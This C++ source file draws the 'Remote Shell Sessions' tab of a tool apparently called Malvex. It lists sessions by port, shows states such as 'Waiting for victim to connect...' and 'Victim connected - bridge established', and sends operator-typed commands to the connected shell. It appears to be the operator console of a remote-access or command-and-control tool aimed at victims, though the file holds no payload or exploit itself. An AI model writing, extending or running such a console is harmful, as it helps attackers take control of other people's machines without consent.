#include "UiShared.hpp"
#include "SessionManager.hpp"

void drawSessionsTab(WindowState& state) {
    static int selected_session = -1;
    static bool commandEditMode = false;
    static std::string terminalOutput = "Terminal started. Type 'mlvx_help' for commands.\n\n";
    static char commandInput[1024] = {0};
    static float scrollOffset = 0;
    static SessionBridgeState last_reported_state = SessionBridgeState::Closed;
    static size_t last_session_count = 0;
    static SessionManager& sessionMan = SessionManager::instance();
    const Color panel_fill{36, 36, 46, 255};
    const Color panel_border{90, 90, 110, 255};

    const auto& res = state.res;
    const auto page = ui::content_area(res);
    draw_malvex_section_header(page, "Remote Shell Sessions");

    const std::vector<SessionDAO>& sessions = sessionMan.getSessions();

    if (sessions.size() > last_session_count) {
        selected_session = static_cast<int>(sessions.size()) - 1;
        last_reported_state = SessionBridgeState::Closed;
    } else if (sessions.size() < last_session_count && selected_session >= static_cast<int>(sessions.size())) {
        selected_session = sessions.empty() ? -1 : static_cast<int>(sessions.size()) - 1;
        last_reported_state = SessionBridgeState::Closed;
    }
    last_session_count = sessions.size();

    auto body = ui::section_content(page);

    if (sessions.empty()) {
        draw_malvex_panel(body, "Currently there are no active Sessions!", panel_fill, panel_border);
        selected_session = -1;
        last_reported_state = SessionBridgeState::Closed;
        return;
    }

    if (selected_session < 0 || selected_session >= static_cast<int>(sessions.size())) {
        selected_session = 0;
    }

    float session_chip_x = body.x;
    for (size_t i = 0; i < sessions.size(); ++i) {
        int original_base = GuiGetStyle(BUTTON, BASE_COLOR_NORMAL);
        int original_text = GuiGetStyle(BUTTON, TEXT_COLOR_NORMAL);

        if (selected_session == static_cast<int>(i)) {
            GuiSetStyle(BUTTON, BASE_COLOR_NORMAL, ColorToInt({150, 30, 70, 255}));
            GuiSetStyle(BUTTON, TEXT_COLOR_NORMAL, ColorToInt({255, 230, 120, 255}));
        }

        const Rectangle chip{session_chip_x, body.y, 34.0f, ui::kControlHeight};
        if (GuiButton(chip, TextFormat("%d", static_cast<int>(i)))) {
            selected_session = static_cast<int>(i);
            last_reported_state = SessionBridgeState::Closed;
        }

        GuiSetStyle(BUTTON, BASE_COLOR_NORMAL, original_base);
        GuiSetStyle(BUTTON, TEXT_COLOR_NORMAL, original_text);
        session_chip_x += chip.width + 6.0f;
    }

    Rectangle session_panel{
        body.x,
        body.y + ui::kControlHeight + ui::kGap,
        body.width,
        std::max(0.0f, body.height - ui::kControlHeight - ui::kGap),
    };

    const SessionDAO& session = sessions.at(selected_session);
    const auto bridge_state = sessionMan.getBridgeState(session);
    const bool session_ready = bridge_state == SessionBridgeState::Ready;

    const char* status_text = "Unknown";
    Color status_color = GRAY;
    switch (bridge_state) {
        case SessionBridgeState::Connecting:
            status_text = "Connecting to session server...";
            status_color = ORANGE;
            break;
        case SessionBridgeState::WaitingForVictim:
            status_text = "Waiting for victim to connect...";
            status_color = GOLD;
            break;
        case SessionBridgeState::Ready:
            status_text = "Bridge established - shell ready";
            status_color = GREEN;
            break;
        case SessionBridgeState::Failed:
            status_text = "Session connection failed";
            status_color = RED;
            break;
        case SessionBridgeState::Closed:
            status_text = "Session closed";
            status_color = MAROON;
            break;
    }

    if (bridge_state != last_reported_state) {
        const char* transition_message = nullptr;
        switch (bridge_state) {
            case SessionBridgeState::Connecting:
                transition_message = "\n[Session] Connecting to session server...\n";
                break;
            case SessionBridgeState::WaitingForVictim:
                transition_message = "\n[Session] Waiting for victim to connect...\n";
                break;
            case SessionBridgeState::Ready:
                transition_message = "\n[Session] Victim connected - bridge established.\n";
                break;
            case SessionBridgeState::Failed:
                transition_message = "\n[Session] Connection failed.\n";
                break;
            case SessionBridgeState::Closed:
                transition_message = "\n[Session] Session closed.\n";
                break;
        }

        if (transition_message != nullptr) {
            terminalOutput += transition_message;
        }

        last_reported_state = bridge_state;
    }

    draw_malvex_panel(
        session_panel,
        TextFormat("Session [%s] on port [%d]", session.uid.c_str(), session.port),
        panel_fill,
        panel_border);

    DrawTextEx(
        state.font,
        status_text,
        {session_panel.x + ui::kPadding, session_panel.y + 34.0f},
        16.0f,
        1.0f,
        status_color);

    if (GuiButton(
            {session_panel.x + session_panel.width - ui::kPadding - 130.0f, session_panel.y + 8.0f, 130.0f, ui::kControlHeight},
            GuiIconText(ICON_CROSS, "Close Shell"))) {
        if (state.client.closeSession(session.port)) {
            sessionMan.close(session.uid);
            last_reported_state = SessionBridgeState::Closed;
        }
    }

    const auto panel_body = ui::panel_body(session_panel, true);
    const float command_bar_height = ui::kControlHeight + ui::kPadding;

    Rectangle outputRect{
        panel_body.x,
        panel_body.y + 20.0f,
        panel_body.width,
        std::max(0.0f, panel_body.height - command_bar_height - 28.0f),
    };

    ui::draw_rounded_rect(outputRect, {24, 24, 32, 255}, {60, 60, 74, 255});
    DrawTextEx(state.font, "Session Output", {outputRect.x + ui::kPadding, outputRect.y - 18.0f}, 14.0f, 1.0f, LIGHTGRAY);

    Vector2 textSize = MeasureTextEx(state.font, terminalOutput.c_str(), 16.0f, 1.0f);

    if (CheckCollisionPointRec(GetMousePosition(), outputRect)) {
        scrollOffset -= GetMouseWheelMove() * 20.0f;

        float maxScroll = textSize.y - outputRect.height + 10.0f;
        if (maxScroll < 0) maxScroll = 0;
        if (scrollOffset < 0) scrollOffset = 0;
        if (scrollOffset > maxScroll) scrollOffset = maxScroll;
    }

    static const int bar_width = 10;
    Rectangle scrollBarBounds{
        outputRect.x + outputRect.width - (bar_width + ui::kPadding),
        outputRect.y + ui::kPadding,
        static_cast<float>(bar_width),
        outputRect.height - ui::kPadding * 2.0f,
    };
    float maxScroll = textSize.y - outputRect.height;
    if (maxScroll < 0) maxScroll = 0;

    if (maxScroll > 0) {
        scrollOffset = static_cast<float>(ui_scroll_bar(
            scrollBarBounds,
            static_cast<int>(scrollOffset),
            0,
            static_cast<int>(maxScroll)));
    }

    BeginScissorMode(
        static_cast<int>(outputRect.x),
        static_cast<int>(outputRect.y),
        static_cast<int>(outputRect.width - bar_width - ui::kPadding),
        static_cast<int>(outputRect.height));

    DrawTextEx(
        state.font,
        terminalOutput.c_str(),
        Vector2{outputRect.x + ui::kPadding, outputRect.y + ui::kPadding - scrollOffset},
        16.0f,
        1.0f,
        {240, 140, 180, 255});

    EndScissorMode();

    Rectangle command_bar{
        panel_body.x,
        panel_body.y + panel_body.height - command_bar_height,
        panel_body.width,
        command_bar_height,
    };

    DrawTextEx(state.font, ">", {command_bar.x, command_bar.y + 4.0f}, 24.0f, 1.0f, {150, 30, 70, 255});

    const float button_width = 64.0f;
    Rectangle commandRect{
        command_bar.x + 24.0f,
        command_bar.y,
        command_bar.width - button_width * 2.0f - ui::kGap * 3.0f - 24.0f,
        ui::kControlHeight,
    };

    if (!session_ready) {
        GuiDisable();
    }

    if (GuiButton({command_bar.x + command_bar.width - button_width * 2.0f - ui::kGap, command_bar.y, button_width, ui::kControlHeight}, "Run") ||
        GuiTextBox(commandRect, commandInput, 1024, commandEditMode && session_ready)) {
        if (session_ready && strlen(commandInput) > 0) {
            run_terminal_command(commandInput, terminalOutput, session);
            commandInput[0] = '\0';

            Vector2 newTextSize = MeasureTextEx(state.font, terminalOutput.c_str(), 16.0f, 1.0f);
            float newMaxScroll = newTextSize.y - outputRect.height;
            if (newMaxScroll > 0) {
                scrollOffset = newMaxScroll;
            }
        }
        commandEditMode = session_ready;
    }

    if (GuiButton({command_bar.x + command_bar.width - button_width, command_bar.y, button_width, ui::kControlHeight}, "Clear")) {
        terminalOutput = "Terminal cleared.\n\n";
        scrollOffset = 0;
    }

    if (!session_ready) {
        GuiEnable();
    }
}
